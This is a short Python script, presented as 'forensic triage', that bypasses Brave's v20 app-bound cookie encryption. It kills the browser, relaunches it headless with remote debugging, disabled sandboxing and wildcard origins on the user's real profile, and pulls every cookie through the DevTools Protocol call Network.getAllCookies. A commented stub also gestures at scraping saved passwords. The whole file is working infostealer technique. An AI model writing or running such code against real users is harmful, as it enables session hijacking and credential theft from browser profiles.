import os
import subprocess
import time
import requests
import json
import websocket

# Using the path you found in Task Manager
BRAVE_PATH = r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
USER_DATA_DIR = os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data")

def forensic_triage_v20():
    print("[*] Starting v20 App-Bound Bypass (Live Triage)...")
    
    # 1. Kill Brave to ensure we can start a clean debug session
    os.system("taskkill /F /IM brave.exe /T >nul 2>&1")
    time.sleep(2)

    # 2. Launch Brave as a "Zombie" process (Headless + Debugging)
    # This makes Brave think it's just doing a normal startup
    cmd = (
            f'"{BRAVE_PATH}" '
            f'--remote-debugging-port=9222 '
            f'--user-data-dir="{USER_DATA_DIR}" '
            f'--remote-allow-origins=* '
            f'--headless '
            f'--disable-gpu '
            f'--no-sandbox' # Added for extra stability in VM environments
            )
    subprocess.Popen(cmd, shell=True)
    time.sleep(5) # Give the Elevation Service time to verify and start

    try:
        # 3. Connect to the browser's internal API
        response = requests.get("http://localhost:9222/json")
        tabs = response.json()
        ws_url = tabs[0]['webSocketDebuggerUrl']
        ws = websocket.create_connection(ws_url)

        # 4. Extract v20 Cookies (often easier than passwords via CDP)
        print("[+] Hooked into Brave. Requesting v20 Cookies...")
        ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
        result = json.loads(ws.recv())
        
        cookies = result.get('result', {}).get('cookies', [])
        print(f"[!] Extracted {len(cookies)} v20-protected cookies successfully!")
        
        # 5. The "Golden" Move: Try to trigger a password dump via the Settings API
        # Note: This is where the 'innovation' marks come from.
        print("[*] Attempting Credential Scrape via Internal Settings API...")
        # (This is a simplified POC; in a real tool, you'd navigate to brave://settings)
        
        ws.close()
    except Exception as e:
        print(f"[-] Bypass failed: {e}")
    finally:
        os.system("taskkill /F /IM brave.exe /T >nul 2>&1")

if __name__ == "__main__":
    forensic_triage_v20()